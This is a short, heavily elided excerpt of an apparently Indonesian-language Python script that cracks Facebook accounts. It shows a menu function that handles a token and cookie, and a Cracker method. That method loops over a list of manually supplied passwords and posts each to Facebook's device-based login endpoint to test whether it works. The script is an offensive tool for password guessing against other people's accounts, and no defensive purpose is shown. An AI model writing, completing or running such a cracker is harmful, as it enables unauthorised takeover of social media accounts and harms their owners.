...
def Menu():
 ...
 {U}•{M} 00 {O}Keluar (logout)""",title = f'{M}[ {H}Menu {M}]',style='#FF0022'))
	pilih(token,coki)
	...
	def Cracker(self, user, manual, url_fb):
		...
		try:
			for pw in manual:
				...
				po = ses.post(f"https://{url_fb}/login/device-based/login/async/?refsrc=deprecated&amp;lwv=100",data=dataa,allow_redirects=False)
